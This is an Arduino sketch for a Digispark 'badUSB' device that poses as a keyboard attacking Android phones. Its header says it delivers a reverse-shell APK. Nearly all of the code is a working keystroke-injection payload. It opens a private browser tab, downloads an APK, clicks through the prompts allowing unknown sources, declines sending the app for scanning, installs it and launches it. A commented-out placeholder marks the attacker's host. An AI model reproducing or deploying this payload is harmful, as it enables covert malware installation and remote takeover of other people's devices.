/*

@title: badUSB attack targeting Android

@author: caioau (caio dot volpato at riseup dot net)

@license: GPLv2

@repo: https://github.com/caioau/badUSB-Targeting-Android

@description: this arduino code will make the Arduino act as a keyboard, 
then will send some keystrokes to Open the browser, download, install and run a
apk (read more on the repo on how to generate the reverse shell apk)

*/



#include "DigiKeyboard.h"

// FIXME: substitute your domain and port here
//#define apkhost "http://192.168.1.201:8080"

//// FIXME: substitute your name here
//#define apkLink "/filename.apk"

# define site "https://download.apkpure.com/b/APK/Y29tLnR3aXR0ZXIuYW5kcm9pZF8xODU2MDAwMF85ODFhOWMwNw?_fn=VHdpdHRlcl92OC41Ni4wLXJlbGVhc2UuMDBfYXBrcHVyZS5jb20uYXBr&as=bef853f13aed44158e742b98e924d11e5f2d4050&ai=-948871978&at=1596800984&_sa=ai%2Cat&k=3f27a80b06b9d2a92c3943fb632cf64c5f2fe2d8&_p=Y29tLnR3aXR0ZXIuYW5kcm9pZA&c=1%7CNEWS_AND_MAGAZINES%7CZGV2PVR3aXR0ZXIlMkMlMjBJbmMuJnQ9YXBrJnM9NTYwMzg5MDAmdm49OC41Ni4wLXJlbGVhc2UuMDAmdmM9MTg1NjAwMDA"

void setup() {
  pinMode(1, OUTPUT);
}

void loop() {
  // calling the sendKeyStroke() function with 0 starts the script
  DigiKeyboard.sendKeyStroke(0);

  DigiKeyboard.delay(2000);

  DigiKeyboard.sendKeyStroke(KEY_B, MOD_GUI_LEFT); // super + b -> open browser

  DigiKeyboard.delay(3000); // wait 3s browser to open


  DigiKeyboard.sendKeyStroke(KEY_N, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT); // control +n open new private tab

  DigiKeyboard.delay(500);

  DigiKeyboard.sendKeyPress(0, MOD_CONTROL_LEFT); // only control

  DigiKeyboard.sendKeyStroke(KEY_L, MOD_CONTROL_LEFT); // then control +l -> link bar

  DigiKeyboard.delay(200);
// 
//  DigiKeyboard.print(apkhost);
//
//  DigiKeyboard.delay(50);
//
//  DigiKeyboard.println(apkLink); // enters the apk link

  DigiKeyboard.println(site);
  DigiKeyboard.delay(200);

  DigiKeyboard.println("\t");

  DigiKeyboard.delay(500);

  DigiKeyboard.println("\t\t");

  DigiKeyboard.delay(500);


  DigiKeyboard.println("\t\t\t\t\t\t"); 


  DigiKeyboard.delay(2000);

  DigiKeyboard.print("\t\t\t\t");

  DigiKeyboard.delay(2000);

  DigiKeyboard.sendKeyStroke(0x50); // left arrow

  DigiKeyboard.delay(500);

  DigiKeyboard.sendKeyStroke(KEY_ENTER); // hit enter to open the downloaded apk

  DigiKeyboard.delay(500);

  DigiKeyboard.println("\t\t");

  DigiKeyboard.delay(500);

  DigiKeyboard.sendKeyStroke(0x51); // key down 3 times

  DigiKeyboard.delay(200);

  DigiKeyboard.sendKeyStroke(0x51);

  DigiKeyboard.delay(200);

  DigiKeyboard.sendKeyStroke(0x51);

  DigiKeyboard.delay(200);

  DigiKeyboard.sendKeyStroke(KEY_ENTER); // hit enter to allow chrome to install unknow apk

  DigiKeyboard.delay(500);

  
  DigiKeyboard.sendKeyPress(0,MOD_GUI_LEFT); 
  DigiKeyboard.sendKeyPress(42,MOD_GUI_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyPress(0,MOD_GUI_LEFT); 
  DigiKeyboard.sendKeyPress(0); 

  DigiKeyboard.delay(1000); // back

  
  for(int i=0; i<= 20; i++){
  
     DigiKeyboard.sendKeyStroke(0x51); // key down
     DigiKeyboard.delay(50);
    
  }

  DigiKeyboard.delay(200);

  DigiKeyboard.sendKeyStroke(0x4F); // right arrow

  DigiKeyboard.delay(200);
 
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // hit enter to open the downloaded apk

  DigiKeyboard.delay(5000);

   DigiKeyboard.sendKeyStroke(0x51); // key down 3 times

  DigiKeyboard.delay(200);

  DigiKeyboard.sendKeyStroke(0x51);

  DigiKeyboard.delay(200);

  DigiKeyboard.sendKeyStroke(0x51);

  DigiKeyboard.delay(200);

  DigiKeyboard.sendKeyStroke(0x50); // left arrow

  DigiKeyboard.delay(200);
  
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // hit enter to install anyway

   DigiKeyboard.delay(5000);

   DigiKeyboard.sendKeyStroke(0x51); // key down 3 times

  DigiKeyboard.delay(200);

  DigiKeyboard.sendKeyStroke(0x51);

  DigiKeyboard.delay(200);

  DigiKeyboard.sendKeyStroke(0x51);

  DigiKeyboard.delay(200);

  DigiKeyboard.sendKeyStroke(0x50); // left arrow

  DigiKeyboard.delay(200);
  
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // hit enter to dont send the apk  

   DigiKeyboard.delay(5000);

   DigiKeyboard.sendKeyStroke(0x51); // key down 2 times

  DigiKeyboard.delay(200);

  DigiKeyboard.sendKeyStroke(0x51);

  DigiKeyboard.delay(200);

  DigiKeyboard.sendKeyStroke(0x4F); // right arrow

  DigiKeyboard.delay(200);
  
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // hit enter to open the installed apk


  for (;;) {  // keep the led blinking when finished
    digitalWrite(1, LOW);
    delay(500);
    digitalWrite(1, HIGH);
    delay(500);
  }
}
